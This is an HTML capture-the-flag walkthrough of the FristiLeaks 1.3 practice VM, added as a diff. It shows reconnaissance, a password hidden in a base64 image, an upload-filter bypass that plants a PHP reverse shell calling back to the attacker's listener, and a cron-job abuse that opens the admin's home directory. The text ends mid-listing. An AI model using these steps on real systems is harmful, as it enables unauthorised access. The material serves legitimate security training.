@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>#FristiLeaks: 1.3</strong></h1>
+        <a href="https://www.vulnhub.com/entry/fristileaks-13,133/">https://www.vulnhub.com/entry/fristileaks-13,133/</a><br>
+        <br>
+        This is a box of many, but small, steps.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>0) Find the VM's IP</strong></h3><br>
+        To find your VM's IP address, set your VM to ‘bridged’ so that it gets assigned an IP on your internal network and then use netdiscover to scan your network: <code>netdiscover -r &lt;internal network&gt;/24</code><br>
+        <br>
+        <code>netdiscover -r 192.168.1.1/24</code><br>
+        192.168.1.114 is my Fristi box.<br>
+        As the vulnhub description says, if you're on vmware edit the VM's mac address to 08:00:27:A5:A6:76<br>
+        Take a snapshot of the VM at this point, just to be safe.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 192.168.1.184</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>fristileaks1.3#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;nmap<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>fristileaks1.3#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>initial.txt&nbsp;192.168.1.114<br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-04-09&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>33&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">Unknown</span>-08-00-27-a5-a6-76.lan&nbsp;(192.168.1.114)<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.00022s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;999&nbsp;filtered&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.2.15&nbsp;((CentOS)&nbsp;DAV/2&nbsp;PHP/5.3.3)<br>
+                |&nbsp;http-methods:&nbsp;<br>
+                |_&nbsp;&nbsp;Potentially&nbsp;risky&nbsp;methods:&nbsp;TRACE<br>
+                |&nbsp;http-robots.txt:&nbsp;3&nbsp;disallowed&nbsp;entries&nbsp;<br>
+                |_/cola&nbsp;/sisi&nbsp;/beer<br>
+                |_http-server-header:&nbsp;Apache/2.2.15&nbsp;(CentOS)&nbsp;DAV/2&nbsp;PHP/5.3.3<br>
+                |_http-title:&nbsp;Site&nbsp;doesn't&nbsp;have&nbsp;a&nbsp;title&nbsp;(text/html;&nbsp;charset=UTF-8).<br>
+                MAC&nbsp;Address:&nbsp;08:00:27:A5:A6:76&nbsp;(Oracle&nbsp;VirtualBox&nbsp;virtual&nbsp;NIC)<br>
+                Warning:&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;find&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                Device&nbsp;type:&nbsp;general&nbsp;purpose<br>
+                Running:&nbsp;Linux&nbsp;2.6.X|3.X<br>
+                OS&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel:2.6&nbsp;cpe:/o:linux:linux_kernel:3<br>
+                OS&nbsp;details:&nbsp;Linux&nbsp;2.6.32&nbsp;-&nbsp;3.10,&nbsp;Linux&nbsp;2.6.32&nbsp;-&nbsp;3.13<br>
+                Network&nbsp;Distance:&nbsp;1&nbsp;hop<br>
+                <br>
+                OS&nbsp;and&nbsp;Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;13.57&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        Nothing new with a full port scan.<br>
+        Alright, 80/http it is.<br>
+        nmap has already provided some interesting information- /cola /sisi and /beer are in /robots.txt.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) Drink!</strong></h2><br>
+        <code>http://192.168.1.114/robots.txt</code><br>
+        <br>
+        <code>User-agent: *<br>
+        Disallow: /cola<br>
+        Disallow: /sisi<br>
+        Disallow: /beer</code><br>
+        <br>
+        As we're told, neither of these URLs are what we were looking for.<br>
+        What are all of these things: cola, sisi, beer? Drinks. (I had to google sisi)<br>
+        <br>
+        The homepage tells us to drink fristi.<br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        Fristi must be a drink also.<br>
+        <br>
+        <code>http://192.168.1.114/fristi</code><br>
+        A login page!<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) Ha ha!</strong></h2><br>
+        Nelson is lauging at us.<br>
+        <br>
+        Right click &gt; view source<br>
+        A note at the top, along with a username - <code>eezeepz</code><br>
+            <div class="codebox">
+                &lt;<span style="color:#ff9d00;font-weight:700">!</span>--&nbsp;<br>
+                TODO<span style="color:#ff9d00;font-weight:700">:</span><br>
+                We&nbsp;need&nbsp;to&nbsp;clean&nbsp;this&nbsp;up&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">production</span>.&nbsp;I&nbsp;left&nbsp;some&nbsp;junk&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;here&nbsp;to&nbsp;<span style="color:#ff9d00;font-weight:700">make</span>&nbsp;testing&nbsp;easier.<br>
+                <br>
+                -&nbsp;by&nbsp;eezeepz<br>
+                --&gt;
+            </div>
+        </div><br>
+        <br>
+        And further down, a big comment of base64.<br>
+            <div class="codebox">
+                iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx<br>
+                jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl<br>
+                S0iAQGY0Nb01<span style="color:#ff9d00;font-weight:700">//</span>dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw<br>
+                B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f<br>
+                m63yaP7<span style="color:#ff9d00;font-weight:700">/</span>XP<span style="color:#ff9d00;font-weight:700">/</span>5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd<span style="color:#ff9d00;font-weight:700">/</span>0TL2Wull5+RMpJq5tMTkE1paHlVXJJ<br>
+                Zv7<span style="color:#ff9d00;font-weight:700">/</span>d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb<br>
+                DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd<br>
+                jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU<br>
+                12qmC<span style="color:#ff9d00;font-weight:700">/</span>1<span style="color:#ff9d00;font-weight:700">/</span>Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5<br>
+                uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16<span style="color:#ff9d00;font-weight:700">/</span>i<span style="color:#ff9d00;font-weight:700">/</span>6BtvvEQzF5YM2JLhyMLz4sNNtp<span style="color:#ff9d00;font-weight:700">/</span>pSkg1<br>
+                04VajmwziEdZvmSz9E0YbzbI<span style="color:#ff9d00;font-weight:700">/</span>FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq<br>
+                i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg<br>
+                tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu<span style="color:#ff9d00;font-weight:700">/</span>PZy7VjHXJmC21H9lWvBBfdZb6Ws<br>
+                30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl<br>
+                3K<span style="color:#ff9d00;font-weight:700">/</span>U+z2uFJNWNcMmhLzUe2v6n<span style="color:#ff9d00;font-weight:700">/</span>dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK<br>
+                ul9iMrFG9gqa<span style="color:#ff9d00;font-weight:700">/</span>VTB8qORLuSTqF7fYU7tgsn<span style="color:#ff9d00;font-weight:700">/</span>4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q<br>
+                mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z<span style="color:#ff9d00;font-weight:700">/</span>vBMWulSfYlm+hDLkcIAtuHEUzu<span style="color:#ff9d00;font-weight:700">/</span>l9l867X34<br>
+                rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy<span style="color:#ff9d00;font-weight:700">/</span>VzOTCkqeBWlrrFhe<br>
+                EPdMjO3SSys7XVF+qmT5UcmT9+Ss<span style="color:#ff9d00;font-weight:700">//</span>fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH<br>
+                AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk<br>
+                CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9<span style="color:#ff9d00;font-weight:700">/</span>QNa7zik1qtycQAAAABJR<br>
+                <span style="color:#7f0044;font-weight:400">U5ErkJggg</span>==
+            </div>
+        </div><br>
+        <br>
+        Considering it was so large, I pasted it into a file using nano and base64 decoded it.<br>
+        Turns out it's a png.<br>
+        Rename the decoded base64 file to a png and have a look<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>fristileaks1.3<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;nano&nbsp;base64.txt<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>fristileaks1.3<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;base64&nbsp;-d&nbsp;base64.txt&nbsp;&gt;&nbsp;base64d.txt<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>fristileaks1.3<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;base64d.txt&nbsp;<br>
+                �PNG<br>
+                �<br>
+                IHDRm4�A�sRGB���gAMA��<br>
+                ...<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>fristileaks1.3<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;base64d.txt&nbsp;<br>
+                base64d.txt<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;PNG&nbsp;image&nbsp;data,&nbsp;365&nbsp;x&nbsp;75,&nbsp;8-bit<span style="color:#ff9d00;font-weight:700">/</span>color&nbsp;RGB,&nbsp;non-interlaced<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>fristileaks1.3<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;<span style="color:#ff9d00;font-weight:700">mv</span>&nbsp;base64d.txt&nbsp;base64d.png
+            </div>
+        </div><br>
+        <br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        We're being lauged at... or is it a password?<br>
+        (I don't think there's any reasonable way you're supposed to know this, I just guessed after a bit and was lucky.)<br>
+        <code>eezeepz / keKkeKKeKKeKkEkkEk</code><br>
+        <br>
+        Log in!<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) php.png</strong></h2><br>
+        <code>http://192.168.1.114/fristi/login_success.php</code><br>
+        <br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        I'd like to upload a shell please, not an image.<br>
+        <br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>fristileaks1.3<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>webshells<span style="color:#ff9d00;font-weight:700">/</span>php<br>
+                findsock.c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;php-findsock-shell.php&nbsp;&nbsp;qsd-php-backdoor.php<br>
+                php-backdoor.php&nbsp;&nbsp;php-reverse-shell.php&nbsp;&nbsp;&nbsp;simple-backdoor.php<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>fristileaks1.3<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;<span style="color:#ff9d00;font-weight:700">cp</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>webshells<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>php-reverse-shell.php&nbsp;.<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>fristileaks1.3<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;nano&nbsp;php-reverse-shell.php
+            </div>
+        </div><br>
+        <br>
+        Edit the shell's callback IP and port to that of your attacking machine.<br>
+        <br>
+            <div class="codebox">
+                //&nbsp;Usage<br>
+                //&nbsp;-----<br>
+                //&nbsp;See&nbsp;http://pentestmonkey.net/tools/php-reverse-shell&nbsp;if&nbsp;you&nbsp;get&nbsp;stuck.<br>
+                <br>
+                set_time_limit&nbsp;(0);<br>
+                $VERSION&nbsp;=&nbsp;"1.0";<br>
+                $ip&nbsp;=&nbsp;'192.168.1.183';&nbsp;&nbsp;//&nbsp;CHANGE&nbsp;THIS<br>
+                $port&nbsp;=&nbsp;9001;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;CHANGE&nbsp;THIS<br>
+                $chunk_size&nbsp;=&nbsp;1400;<br>
+                $write_a&nbsp;=&nbsp;null;<br>
+                $error_a&nbsp;=&nbsp;null;<br>
+                $shell&nbsp;=&nbsp;'uname&nbsp;-a;&nbsp;w;&nbsp;id;&nbsp;/bin/sh&nbsp;-i';<br>
+                $daemon&nbsp;=&nbsp;0;<br>
+                $debug&nbsp;=&nbsp;0;<br>
+                <br>
+                //<br>
+                //&nbsp;Daemonise&nbsp;ourself&nbsp;if&nbsp;possible&nbsp;to&nbsp;avoid&nbsp;zombies&nbsp;later<br>
+                //<br>
+            </div>
+        </div><br>
+        <br>
+        <code>Sorry, is not a valid file. Only allowed are: png,jpg,gif<br>
+        Sorry, file not uploaded.</code><br>
+        <br>
+        Outrageous.<br>
+        Fine, a png instead.<br>
+        <br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>fristileaks1.3<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;<span style="color:#ff9d00;font-weight:700">mv</span>&nbsp;php-reverse-shell.php&nbsp;monkey.php.png
+            </div>
+        </div><br>
+        <br>
+        <code>Uploading, please wait<br>
+        The file has been uploaded to /uploads.</code><br>
+        <br>
+        Success!<br>
+        <br>
+        Prep to receive the shell<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>fristileaks1.3<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Run the reverse shell by visiting it:<br>
+        <code>http://192.168.1.114/fristi/uploads/monkey.php.png</code><br>
+        And check back on your listener.<br>
+        <br>
+        We have a shell!<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>fristileaks1.3<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[192.168.1.183]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[192.168.1.114]&nbsp;45962<br>
+                Linux&nbsp;Unknown-08-00-27-a5-a6-76&nbsp;2.6.32-573.8.1.el6.x86_64&nbsp;<span style="color:#0088ff;font-weight:400">#1&nbsp;SMP&nbsp;Tue&nbsp;Nov&nbsp;10&nbsp;18:01:38&nbsp;UTC&nbsp;2015&nbsp;x86_64&nbsp;x86_64&nbsp;x86_64&nbsp;GNU/Linux</span><br>
+                &nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>26<span style="color:#ff9d00;font-weight:700">:</span>11&nbsp;up&nbsp;&nbsp;1<span style="color:#ff9d00;font-weight:700">:</span>55,&nbsp;&nbsp;0&nbsp;users,&nbsp;&nbsp;load&nbsp;average<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0.00,&nbsp;0.00,&nbsp;0.00<br>
+                USER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FROM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOGIN@&nbsp;&nbsp;&nbsp;IDLE&nbsp;&nbsp;&nbsp;JCPU&nbsp;&nbsp;&nbsp;PCPU&nbsp;WHAT<br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=48<span style="color:#ff9d00;font-weight:700">(</span>apache<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=48<span style="color:#ff9d00;font-weight:700">(</span>apache<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=48<span style="color:#ff9d00;font-weight:700">(</span>apache<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">sh:</span>&nbsp;no&nbsp;job&nbsp;control&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;this&nbsp;shell<br>
+                sh-4.1$
+            </div>
+        </div><br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) crypted</strong></h2><br>
+        Have a look around...<br>
+            <div class="codebox">
+                sh-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<br>
+                total&nbsp;28K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>.&nbsp;&nbsp;5&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Nov&nbsp;19&nbsp;&nbsp;2015&nbsp;.<br>
+                dr-xr-xr<span style="color:#ffdd00;font-weight:400">-x</span>.&nbsp;22&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Apr&nbsp;&nbsp;9&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>30&nbsp;..<br>
+                drwx------.&nbsp;&nbsp;2&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Nov&nbsp;19&nbsp;&nbsp;2015&nbsp;admin<br>
+                drwx---r<span style="color:#ffdd00;font-weight:400">-x</span>.&nbsp;&nbsp;5&nbsp;eezeepz&nbsp;&nbsp;&nbsp;eezeepz&nbsp;&nbsp;&nbsp;&nbsp;12K&nbsp;Nov&nbsp;18&nbsp;&nbsp;2015&nbsp;eezeepz<br>
+                drwx------&nbsp;&nbsp;&nbsp;2&nbsp;fristigod&nbsp;fristigod&nbsp;4.0K&nbsp;Nov&nbsp;19&nbsp;&nbsp;2015&nbsp;fristigod<br>
+                <br>
+                sh-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>eezeepz<br>
+                total&nbsp;2.6M<br>
+                ...<br>
+                -r--r--r--.&nbsp;1&nbsp;eezeepz&nbsp;eezeepz&nbsp;&nbsp;514&nbsp;Nov&nbsp;18&nbsp;&nbsp;2015&nbsp;notes.txt<br>
+                ...<br>
+                <br>
+                sh-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>eezeepz<span style="color:#ff9d00;font-weight:700">/</span>notes.txt<br>
+                Yo&nbsp;EZ,<br>
+                <br>
+                I&nbsp;made&nbsp;it&nbsp;possible&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">you</span>&nbsp;to&nbsp;<span style="color:#ff9d00;font-weight:700">do</span>&nbsp;some&nbsp;automated&nbsp;checks,&nbsp;<br>
+                but&nbsp;I&nbsp;did&nbsp;only&nbsp;allow&nbsp;you&nbsp;access&nbsp;to&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>*&nbsp;system&nbsp;binaries.&nbsp;I&nbsp;did<br>
+                however&nbsp;copy&nbsp;a&nbsp;few&nbsp;extra&nbsp;often&nbsp;needed&nbsp;commands&nbsp;to&nbsp;my&nbsp;<br>
+                homedir<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">chmod</span>,&nbsp;<span style="color:#ff9d00;font-weight:700">df</span>,&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>,&nbsp;echo,&nbsp;<span style="color:#ff9d00;font-weight:700">ps</span>,&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>,&nbsp;<span style="color:#ff9d00;font-weight:700">egrep</span>&nbsp;so&nbsp;you&nbsp;can&nbsp;use&nbsp;those<br>
+                from&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>admin<span style="color:#ff9d00;font-weight:700">/</span><br>
+                <br>
+                Don<span style="color:#3ad900;font-weight:400">'t&nbsp;forget&nbsp;to&nbsp;specify&nbsp;the&nbsp;full&nbsp;path&nbsp;for&nbsp;each&nbsp;binary!<br>
+                <br>
+                Just&nbsp;put&nbsp;a&nbsp;file&nbsp;called&nbsp;"runthis"&nbsp;in&nbsp;/tmp/,&nbsp;each&nbsp;line&nbsp;one&nbsp;command.&nbsp;The&nbsp;<br>
+                output&nbsp;goes&nbsp;to&nbsp;the&nbsp;file&nbsp;"cronresult"&nbsp;in&nbsp;/tmp/.&nbsp;It&nbsp;should&nbsp;<br>
+                run&nbsp;every&nbsp;minute&nbsp;with&nbsp;my&nbsp;account&nbsp;privileges.<br>
+                <br>
+                -&nbsp;Jerry</span>
+            </div>
+        </div><br>
+        <br>
+        We can run <code>chmod</code>, <code>df</code>, <code>cat</code>, <code>echo</code>, <code>ps</code>, <code>grep</code> and <code>egrep</code> as user admin if we specify the full path of the binary<br>
+        e.g. <code>/home/admin/chmod</code><br>
+        and put it in a file called <code>runthis</code> in <code>/tmp</code><br>
+        and wait 1 minute.<br>
+        <br>
+        I tried a few things. Eventually I decided to give myself read access to /home/admin<br>
+        <br>
+            <div class="codebox">
+                sh-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<br>
+                sh-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">touch</span>&nbsp;runthis<br>
+                sh-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                runthis<br>
+                sh-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"/home/admin/chmod&nbsp;777&nbsp;/home/admin"</span>&nbsp;&gt;&nbsp;runthis<br>
+                sh-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;runthis<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>admin<span style="color:#ff9d00;font-weight:700">/chmod</span>&nbsp;777&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>admin<br>
+                sh-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>admin<br>
+                total&nbsp;652K<br>
+                drwxrwxrwx.&nbsp;2&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Nov&nbsp;19&nbsp;&nbsp;2015&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>.&nbsp;5&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Nov&nbsp;19&nbsp;&nbsp;2015&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--.&nbsp;1&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;18&nbsp;Sep&nbsp;22&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--.&nbsp;1&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;176&nbsp;Sep&nbsp;22&nbsp;&nbsp;2015&nbsp;.bash_profile<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--.&nbsp;1&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;124&nbsp;Sep&nbsp;22&nbsp;&nbsp;2015&nbsp;.bashrc<br>
